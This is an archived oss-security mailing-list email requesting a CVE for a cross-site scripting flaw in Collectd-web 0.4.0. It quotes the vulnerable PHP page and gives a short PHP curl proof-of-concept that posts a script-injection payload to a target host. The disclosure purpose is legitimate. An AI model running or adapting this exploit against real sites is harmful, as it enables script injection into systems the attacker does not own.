X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4384" "Sunday" "22" "May" "2016" "04:18:15" "-0400" "Mehrdad Linux" "mehrdadlinux@gmail.com" "<CAC3DZsSAGJO6N4FbF_A4LU669hwsXST_vqKsR9zzEkPrKRr=Uw@mail.gmail.com>" "133" "[oss-security] CVE Request -XSS Vulnerabilitie in Collectd-web" nil nil nil "5" "2016052208:18:15" "[oss-security] CVE Request -XSS Vulnerabilitie in Collectd-web" (number mark "U       mehrdadlinux May 22  133/4384  " thread-indent "\"[oss-security] CVE Request -XSS Vulnerabilitie in Collectd-web\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20159 invoked by uid 550); 22 May 2016 15:55:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11434 invoked from network); 22 May 2016 08:19:06 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=PpunuDN9rM0+nX/wQjw7GsptuT6kmC0UReJXGuOZgqg=;
        b=yk8e0ilD63nnBI0cvbbXBwT1NDBYp027kcVOZUXYVmi5ig9W9lbHQTn4ZpMDUdGsNP
         lseY4j/daoKFOX0HrZJjNoBtfmqfp9KCDo0TO2OwJbdZ8eVdBruZfnacR8BGvtd3e4jq
         /7k3EEloD+Rx8kU7vm//DmBar9q2mWmKvE0fMTC6tdFw4nMgtMxtBAZQq4DR92v+uaeP
         suF+N5Bfk3uBWVUVu2rXG8fMV5nlTEM370z3453M/Drt6xP95GQryW10BscMDLTFXwCi
         glrafo6tSFkjOsvjVfpuy7kCc0/K17FrUiUHuUavD3Il3a7hSao2SVXfdkqBjOUGM4BJ
         c9Ig==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=PpunuDN9rM0+nX/wQjw7GsptuT6kmC0UReJXGuOZgqg=;
        b=ZNJ2rd92ElDIZWirrzGpz2gcnZkfhrAkYRAkBOp4A8yJP9TffjafbiTwYknxVPGXaq
         R6UBypM3ICvwnOTYQLfMQa0BlbTkW0l3wGN3q2ZtgIa8lmsc8/HTasXxQkB60jFF/LxF
         EM0EzjNxggW5Qk8k8e6qPF8K2Z7qtRCnEclDCJ9EfvUyrMcCCT6f/bnh3lcPuj47Ej15
         uwQROJqLkDp6W1Ram55/UEJuutphV5OlZ0SKNOnVg8iApAnwPmgiFfRXgZ+xOro7dx9+
         5t+HtbudstxCn4pPQPJppcrCDZG+HLJ5kyP0LvlRB0Igo/E3TjZfzOj1URxKUbm0mGFB
         fbUg==
X-Gm-Message-State: ALyK8tIkg/86CJOTqpoVuWvmClzC+MHvrf4cuNlVCT1b/y6eFYH5Ey+DAlCs41SA7UI7pbKGgOwuvZJYK7rcWg==
X-Received: by 10.112.16.168 with SMTP id h8mr1638637lbd.111.1463905134566;
 Sun, 22 May 2016 01:18:54 -0700 (PDT)
MIME-Version: 1.0
From: Mehrdad Linux <mehrdadlinux@gmail.com>
Date: Sun, 22 May 2016 04:18:15 -0400
Message-ID: <CAC3DZsSAGJO6N4FbF_A4LU669hwsXST_vqKsR9zzEkPrKRr=Uw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a11c3acb287e228053369f940
Subject: [oss-security] CVE Request -XSS Vulnerabilitie in Collectd-web

--001a11c3acb287e228053369f940
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Title -Collectd-web XSS

# Exploit Title :  XSS Vulnerabilitie in Collectd-web
# Date: Sun May 22 11:55:36 EDT 2016
# Reported Date : Sun May 22 11:55:36 EDT 2016
# Vendor Homepage: https://collectd.org/wiki/index.php/Collectd-web
# Version: Version: 0.4.0
# Software Link: https://github.com/httpdss/collectd-web
# solution :https://github.com/httpdss/collectd-web/issues/77
# Exploit Author :MehrdadLinux
# Tested On : Linux Platforms.
# Facebook : https://facebook.com/MehrdadLinux
# Twitter : http://twitter.com/MehrdadLinux
# Detailed Vul: http://blog.opsnit.com
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

1. VULNERABILITY
-------------------------

XSS Vulnerabilitie  in Collectd-web  0.4.0 =E2=80=93 January2016


2. BACKGROUND
-------------------------
Collectd-web is a web-based front-end for RRD data collected by collectd.
It is based on contrib/collection.cgi, a demo CGI script included in
collectd.
With strong emphasis on the usage of Jquery and JqueryUI, Collectd-Web
manages to give sysadmins a nice yet functional interface.


3. DESCRIPTION
-------------------------
XSS in ajax_post.php
https://github.com/httpdss/collectd-web/blob/master/media/jqtouch/demos/mai=
n/ajax_post.php

  1 <?php
  2 $theaters =3D array("Los Gatos Cinema","Cinelux Plaza Theatre","Camera
7");
  3 $movies =3D array("Transformers","Knocked Up","Live Free Die Hard");
  4 $title =3D "-";
  5 if ($_POST["zip"]) {
  6     $title =3D "Zip " . $_POST['zip'];
  7 } else {
  8     $title =3D $_POST['movie'];
  9 }
 10 ?>
 11 <div>
 12     <div class=3D"toolbar">
 13         <h1><?php echo $title ?></h1>
 14         <a href=3D"#" class=3D"button back">Back</a>
 15     </div>
 16     <ul class=3D"edgetoedge">
 17     <?php
 18         if ($_POST['zip']) {
 19             foreach ($theaters as $theater) {
 20                 echo '<li><a href=3D"#theater">' . $theater . '</a></li=
>';
 21             }
 22         } else {
 23             foreach ($movies as $movie) {
 24                 echo '<li><a href=3D"#movie">' . $movie . '</a></li>';
 25             }
 26         }
 27     ?>
 28     </ul>
 29     <form action=3D"ajax_post.php" method=3D"POST">
 30     <ul class=3D"rounded">
 31         <li><input type=3D"text" name=3D"zip" value=3D"" placeholder=3D=
"Live
post event test" /></li>
 32     </ul>
 33     <a style=3D"margin:0 10px;color:rgba(0,0,0,.9)" href=3D"#"
class=3D"submit whiteButton">Submit</a>
 34
 35     </form>
 36 </div>

in line 5 have VULNERABILITY in zip POST method


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3DExploit=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D
<?php
$yourtarget =3D $argv[1];
$ch =3D curl_init();
curl_setopt($ch, CURLOPT_URL, "http://
$yourtarget/collectd-web/media/jqtouch/demos/main/ajax_post.php");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01;
Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
"movie=3D></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(77,101,104,114,100=
,97,100,76,105,110,117,120,32,88,83,83))</SCRIPT>");
$buf =3D curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;
?>

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D

4. discovered by :
-------------------------

The vulnerability has been discovered by Mehrdad Abbasi(MehrdadLinux) and
Hossein Masoudi (cs.masoudi)
email : MehrdadLinux (at) gmail (dot) com
http://opsnit.com


5 .LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this
information.

--001a11c3acb287e228053369f940--
